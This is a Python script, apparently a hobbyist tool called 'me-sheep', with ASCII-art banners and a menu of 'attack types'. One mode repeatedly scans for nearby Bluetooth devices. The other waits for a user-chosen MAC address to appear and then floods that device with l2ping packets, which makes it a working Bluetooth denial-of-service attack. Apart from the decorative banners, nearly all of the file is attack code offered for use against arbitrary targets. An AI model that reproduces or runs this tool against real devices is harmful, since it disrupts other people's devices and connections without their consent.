import subprocess
import time
import threading
import os

def hci_scan():
    while True:
        try:
            devices = subprocess.check_output(['hcitool', 'scan'], text=True)
            if devices:
                print(devices)
                print(" ")
            else:
                print("No devices. Restarting scan...")

            print("Next scan is coming...")
            time.sleep(5)

        except subprocess.CalledProcessError as e:
            print("Error while scanning for devices:", e)

def intercept_address(mac_addr):
    packages_size = 600
    threads_count = 10

    while True:
        print("Scanning for devices...")
        try:
            devices = subprocess.check_output(['hcitool', 'scan'], text=True)
            if mac_addr in devices:
                print(f" → → MAC address {mac_addr} found ← ←")
                print("Starting attack in 3 seconds!")
                time.sleep(2)

                for i in range(100):
                    ping_process = subprocess.Popen(['l2ping', '-i', 'hci0', '-s', str(packages_size), '-f', '-c', '1', mac_addr])
                    ping_process.wait()

            else:
                print(f"MAC address {mac_addr} not found! Retrying in 5 seconds...")
                time.sleep(4)

        except subprocess.CalledProcessError as e:
            print("Error while scanning for devices:", e)

if __name__ == "__main__":
    os.system('clear')
    print("""
                                             
                             _               
 _____ ___      ___      ___| |_ ___ ___ ___ 
|     | -_|    |___|    |_ -|   | -_| -_| . |
|_|_|_|___|             |___|_|_|___|___|  _|
                                        |_|  
""")

    print("""
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣐⡙⠶⣿⣷⣌⡳⣿⡿⠿⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡴⠮⠁⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠙⠟⢿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⣀⡘⠿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠃⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠻⣅⠀⠀⠀⠀⠀⢈⣹⣄⣼⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠓⠒⠂⠀⣿⣰⣠⡀⠀⠀⢰⣦⣾⠷⠶⢤⣾⡦⠾⠉⠉⠉⠙⠿⢶⣦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣤⣤⣀⢀⣠⠄⠉⣻⡷⠾⠛⠁⠀⠀⠀⠀⠀⠝⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢀⣀⣠⡴⢿⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠻⣧⣀⣌⠁⢀⡶⠞⠁⠀⠀⠀⣀⣤⣤⣄⠀⠀⢀⡾⠀⠀⠀⠀⠀⣠⡾⠿⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡼⠛⠋⠉⠀⠀⠀⠀⠀⠉⠉⠙⠳⣄⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⡿⠉⠉⠉⠀⠀⠀⠀⣰⣾⣿⣿⠾⠋⠀⠀⠈⢹⡷⠶⠶⠶⠿⠟⣷⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠟⠒⠛⠉⠛⠒⠦⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀
⠀⠀⢀⣼⡿⠋⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⣸⠇⠀⠀⠀⠀⠀⠹⣷⣶⠶⠶⠤⠶⣶⣟⡋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢦⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀
⠀⣠⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠙⣷⡄⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡄⠀
⣸⡿⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠰⣏⢿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄
⢿⣇⠀⢀⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢺
⢸⣿⢿⡏⠀⠀⠀⣀⡤⠀⢀⣀⣀⣠⣤⡶⠶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠙⢿⡟⠓⠛⠋⣁⣀⣴⣿⣿⣿⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠶⠋⠀⠀⣤⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀
⠀⠀⠀⠙⠻⠟⠛⠛⠉⠉⠀⠀⢹⣿⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⠀⠀          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠛⠓⠦⢤⠆⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀    me-sheep⠀ ⠀⠀⠀⠀  ⠀⠀⠀⢹
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡗⠢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣶⢤⣤⣀⣀⡀⠀⢀⣴⠴⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⡀⠀⠀⠀⠀⢸⡏
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⣈⠉⠉⠉⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢐⡏⢰⡇⠀⠀⠀⠀⣾⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⠓⠶⣞⣁⡀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠀⠀⠀⠀⠀⠀⣰⠟⢐⡿⠃⠀⠀⠀⠀⣸⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠙⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠋⠀⠀⠀⢠⣤⠞⠁⢀⡿⠃⠀⠀⣠⠟⣴⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡛⠲⢦⣄⣀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⣀⣀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣁⣀⣠⣞⣡⣼⡿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣄⣀⣈⡉⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⠉⠉⢹⡇⠀⠀⠀⠀⠀⣀⣰⣾⠛⣻⡟⠈⠉⠉⠉⢿⣿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣌⣉⠉⠉⣡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠞⠁⠀⠀⢀⣴⡿⣤⣀⣴⠶⡴⠏⠉⢹⣿⠀⣿⡇⠀⠀⠀⠀⠈⣿⡄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡉⠓⠆⠀⠙⣦⡀⠀⠀⣀⡀⠀⣀⣤⠴⠛⠁⠀⠀⠀⠀⢼⡏⠀⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⢿⣇⠀⠀⠀⠀⣰⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⠤⢤⣄⣀⣈⣙⣻⡿⠋⠉⠻⣿⣀⠀⠀⠀⢀⣀⣤⣶⠏⠀⠀⠀⠀⣿⡇⠀⠀⠀⢸⣿⠀⠘⣿⡄⠀⠀⠀⣿⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣇⠀⠀⠈⠉⠉⢿⣿⠃⠀⠀⠀⢻⣿⡟⠃⠀⠈⠉⢹⣿⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⠘⣿⠀⠀⢹⡇⠀⠀⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠈⣿⡇⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢀⣿⡇⠀⢸⡇⠀⠀⠀⣿⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⣿⡏⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⢸⣿⠀⢀⡀⠀⣾⣿⠁⠀⣼⡇⠀⠀⠀⠘⣿⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⢀⣿⡄⠀⠀⠀⣿⣏⣀⣾⣀⣰⡿⠃⠀⣰⣿⠀⠀⠀⠀⠀⣼⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⢸⣿⡀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣼⣿⠇⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⠀⠀⣿⠇⠀⢀⡀⠀⢰⣿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡏⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⣼⡇⢀⣿⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⠀⠀⠀⢀⣾⣿⠂⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠷⠿⠿⠟⠛⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⣼⣿⠁⠀⠀⠀⠀⠀⣠⣿⠀⠀⠀⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⢀⡆⠀⠀⣠⣿⡏⠀⠀⠀⠀⠀⣠⣿⠇⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠶⠛⠻⠿⠟⠛⠋⠀⠀⠀⠀⠀⢀⣿⠏⠀⠀⠀⠀⢀⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠋⢀⡄⠀⠀⣰⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⣤⣾⣷⡤⠾⢟⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                                            
""")
    print(" ")
        
    print("Attack types:\n\n"\
          "\t1.) Prowler mode (scan discoverable BT devices every 10 seconds)\n"\
          "\t2.) Interception-attack mode (scan until detect a specific MAC address, then attack)\n\n")

    opt = input("Option: ")
      
    if opt == "1":
        os.system('clear')
        print("""
 _____               _                        _     
|  _  |___ ___ _ _ _| |___ ___    _____ ___ _| |___ 
|   __|  _| . | | | | | -_|  _|  |     | . | . | -_|
|__|  |_| |___|_____|_|___|_|    |_|_|_|___|___|___|
                                                    
""")
        print(" ")
        print("Starting BT scan by hcitool...")
        hci_scan()
    elif opt == "2":
        os.system('clear')
        print("""
 _____     _                       _   _                 _   _           _                  _     
|     |___| |_ ___ ___ ___ ___ ___| |_|_|___ ___ ___ ___| |_| |_ ___ ___| |_    _____ ___ _| |___ 
|-   -|   |  _| -_|  _|  _| -_| . |  _| | . |   |___| .'|  _|  _| .'|  _| '_|  |     | . | . | -_|
|_____|_|_|_| |___|_| |___|___|  _|_| |_|___|_|_|   |__,|_| |_| |__,|___|_,_|  |_|_|_|___|___|___|
                              |_|                                                                 
""")
        print(" ")
        macopt = input("MAC address to attack: ")
        intercept_address(macopt)
    else:
        print("Invalid option.")
